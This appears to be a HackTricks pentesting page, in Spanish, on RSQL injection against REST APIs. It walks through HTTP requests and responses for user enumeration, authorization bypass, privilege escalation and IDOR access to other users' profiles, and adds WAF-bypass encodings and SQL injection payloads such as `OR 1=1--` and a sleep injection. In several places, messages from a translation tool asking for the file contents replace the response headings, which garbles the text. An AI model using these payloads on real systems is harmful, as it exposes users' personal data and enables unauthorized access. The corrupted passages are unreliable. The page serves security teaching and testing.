# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## ¿Qué es RSQL?
RSQL es un lenguaje de consultas diseñado para el filtrado parametrizado de entradas en RESTful APIs. Basado en FIQL (Feed Item Query Language), originalmente especificado por Mark Nottingham para consultar feeds Atom, RSQL destaca por su simplicidad y su capacidad para expresar consultas complejas de forma compacta y compatible con URI sobre HTTP. Esto lo convierte en una excelente opción como lenguaje de consulta general para búsquedas en endpoints REST.

## Resumen
RSQL Injection es una vulnerabilidad en aplicaciones web que usan RSQL como lenguaje de consultas en RESTful APIs. Similar a [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) y [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection), esta vulnerabilidad ocurre cuando los filtros RSQL no se sanitizan correctamente, permitiendo a un atacante inyectar consultas maliciosas para acceder, modificar o eliminar datos sin autorización.

## ¿Cómo funciona?
RSQL permite construir consultas avanzadas en RESTful APIs, por ejemplo:
```bash
/products?filter=price>100;category==electronics
```
Esto se traduce en una consulta estructurada que filtra productos con precio mayor que 100 y categoría “electrónica”.

Si la aplicación no valida correctamente la entrada del usuario, un atacante podría manipular el filtro para ejecutar consultas inesperadas, tales como:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
O incluso aprovecharlo para extraer información sensible mediante consultas booleanas o subconsultas anidadas.

## Riesgos
- **Exposición de datos sensibles:** Un atacante puede recuperar información que no debería ser accesible.
- **Modificación o eliminación de datos:** Inyección de filtros que alteran registros de la base de datos.
- **Escalada de privilegios:** Manipulación de identificadores que otorgan roles a través de filtros para engañar a la aplicación y acceder con privilegios de otros usuarios.
- **Evasión de controles de acceso:** Manipulación de filtros para acceder a datos restringidos.
- **Suplantación o IDOR:** Modificación de identificadores entre usuarios a través de filtros que permiten acceder a la información y recursos de otros usuarios sin estar debidamente autenticado como tal.

## Operadores RSQL soportados
| Operador  | Descripción | Ejemplo  |
|:----: |:----: |:------------------:|
| `;` / `and` | Operador lógico **AND**. Filtra filas donde *ambas* condiciones son *verdaderas* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Operador lógico **OR**. Filtra filas donde *al menos una* condición es *verdadera*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Realiza una consulta de **igualdad**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son exactamente iguales a *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Realiza una consulta de **búsqueda**. Devuelve todas las filas de *myTable* donde los valores en *columnA* contienen *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Realiza una consulta **like**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son similares a *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Realiza una consulta **in**. Devuelve todas las filas de *myTable* donde *columnA* contiene *valueA* OR *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Realiza una consulta de **exclusión**. Devuelve todas las filas de *myTable* donde los valores en *columnA* no son ni *valueA* ni *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Realiza una consulta de *no igualdad*. Devuelve todas las filas de *myTable* donde los valores en *columnA* no son iguales a *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Realiza una consulta de **no like**. Devuelve todas las filas de *myTable* donde los valores en *columnA* no son similares a *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Realiza una consulta de **menor que**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son menores que *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Realiza una consulta de **menor o igual que**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son menores o iguales que *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Realiza una consulta de **mayor que**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son mayores que *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Realiza una consulta de **mayor o igual que**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son iguales o mayores que *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Realiza una consulta de **rango**. Devuelve todas las filas de *myTable* donde los valores en *columnA* son iguales o mayores que *fromValue*, y menores o iguales que *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Nota**: Tabla basada en información de [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) y de la aplicación [**rsql-parser**](https://github.com/jirutka/rsql-parser).

#### Ejemplos
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Nota**: Tabla basada en información de la aplicación [**rsql-parser**](https://github.com/jirutka/rsql-parser).

## Filtros comunes
Estos filtros ayudan a refinar consultas en APIs:

| Filtro | Descripción | Ejemplo |
|--------|------------|---------|
| `filter[users]` | Filtra resultados por usuarios específicos | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Filtra por estado (activo/inactivo, completado, etc.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Filtra resultados dentro de un rango de fechas | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Filtra por categoría o tipo de recurso | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Filtra por un identificador único | `/api/v2/posts?filter[id]=42` |


## Parámetros comunes
Estos parámetros ayudan a optimizar las respuestas de la API:

| Parámetro | Descripción | Ejemplo |
|-----------|------------|---------|
| `include` | Incluye recursos relacionados en la respuesta | `/api/v2/orders?include=customer,items` |
| `sort` | Ordena resultados en orden ascendente o descendente | `/api/v2/users?sort=-created_at` |
| `page[size]` | Controla el número de resultados por página | `/api/v2/products?page[size]=10` |
| `page[number]` | Especifica el número de página | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Define qué campos devolver en la respuesta | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Realiza una búsqueda más flexible | `/api/v2/posts?search=technology` |

## Divulgación de información y enumeración de usuarios
La siguiente petición muestra un endpoint de registro que requiere el parámetro email para comprobar si hay algún usuario registrado con ese email y devolver true o false dependiendo de si existe o no en la base de datos:
### Petición
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Respuesta
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Aunque se espera `/api/registrations?email=<emailAccount>`, es posible utilizar filtros RSQL para intentar enumerar y/o extraer información de usuarios mediante el uso de operadores especiales:
### Solicitud
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Respuesta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
En caso de coincidir con una cuenta de correo válida, la aplicación devolvería la información del usuario en lugar del clásico *“true”*, *"1"* o cualquier otra cosa en la respuesta al servidor:
### Solicitud
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
No tengo el contenido del archivo src/pentesting-web/rsql-injection.md. Por favor pega el texto (incluyendo el Markdown) que quieres que traduzca al español.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
En este escenario, partimos de un usuario con un rol básico y en el que no tenemos permisos privilegiados (p. ej. administrator) para acceder a la lista de todos los usuarios registrados en la base de datos:
### Request
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Respuesta
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
De nuevo hacemos uso de los filtros y operadores especiales que nos permitirán una forma alternativa de obtener la información de los users y evadir el control de acceso. Por ejemplo, filtrar por aquellos *users* que contienen la letra “*a*” en su *ID*:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. Please paste the markdown text you want translated (or confirm you mean only the heading "### Response"), and I'll translate it to Spanish keeping all markdown/html/tags and paths unchanged.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
Es muy probable encontrar ciertos endpoints que comprueban los privilegios de usuario a través de su rol. Por ejemplo, estamos tratando con un usuario que no tiene privilegios:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
No veo el contenido del archivo src/pentesting-web/rsql-injection.md. Por favor pega aquí el contenido (incluyendo el markdown) y lo traduciré al español manteniendo exactamente la misma sintaxis y las excepciones indicadas.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Usando ciertos operadores podríamos enumerar usuarios administradores:
### Solicitud
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
No se proporcionó el contenido del archivo. Por favor pega el contenido de src/pentesting-web/rsql-injection.md que quieres traducir (incluyendo el markdown). Mantendré exactamente la sintaxis markdown/html y no traduciré código, tags, links ni rutas.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Tras conocer el identificador de un usuario administrador, sería posible explotar una escalada de privilegios reemplazando o añadiendo el filtro correspondiente con el identificador del administrador y obteniendo los mismos privilegios:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Respuesta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Además del uso del parámetro `filter`, es posible usar otros parámetros como `include` que permiten incluir en el resultado ciertos parámetros (p. ej., language, country, password...).

En el siguiente ejemplo se muestra la información de nuestro perfil de usuario:
### Solicitud
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor, pega el contenido de src/pentesting-web/rsql-injection.md que quieres que traduzca al español. Mantendré exactamente la misma sintaxis markdown/html y las reglas que indicaste.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
La combinación de filtros puede usarse para evadir el control de autorización y obtener acceso a los perfiles de otros usuarios:
### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Detección & fuzzing: victorias rápidas
- Comprueba soporte RSQL enviando sondas inocuas como `?filter=id==test`, `?q==test` o operadores malformados `=foo=`; las APIs verbosas a menudo leak errores del parser ("Unknown operator" / "Unknown property").
- Muchas implementaciones analizan dos veces los parámetros de URL; prueba doble-codificar `(`, `)`, `*`, `;` (p. ej., `%2528admin%2529`) para bypassear blocklists ingenuas y WAFs.
- Boolean exfil con wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` y voltea la lógica con `,` (OR) para comparar tamaños de respuesta.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` enumera rápidamente por año sin conocer los IDs exactos.

## Abuso específico de framework (Elide / JPA Specification / JSON:API)
- Elide y muchos proyectos Spring Data REST traducen RSQL directamente a JPA Criteria. Cuando los desarrolladores añaden operadores personalizados (p. ej., `=ilike=`) y construyen predicados mediante concatenación de cadenas en lugar de parámetros preparados, puedes pivotar a SQLi (payload clásico: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store acepta columnas parametrizadas; combinar parámetros analíticos controlados por el usuario con filtros RSQL fue la causa raíz del SQLi en CVE-2022-24827. Incluso si las versiones parcheadas parametrizan correctamente, código bespoke similar a menudo permanece—busca expresiones SpEL en `@JoinFilter`/`@ReadPermission` que contengan `${}` e intenta inyectar `';sleep(5);'` o tautologías lógicas.
- Los backends JSON:API comúnmente exponen tanto `include` como `filter`. Filtrar en recursos relacionados `filter[orders]=customer.email==*admin*` puede bypassear ACLs de alto nivel porque los filtros a nivel de relación se ejecutan antes de las comprobaciones de propiedad.

## Ayudantes de automatización
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` valida payloads localmente y muestra el abstract syntax tree—útil para crear paréntesis balanceados y operadores personalizados.
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Combínalo con un HTTP fuzzer (ffuf, turbo-intruder) iterando posiciones wildcard `*a*`, `*e*`, etc., dentro de listas `=in=` para enumerar IDs y correos rápidamente.

## Referencias
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
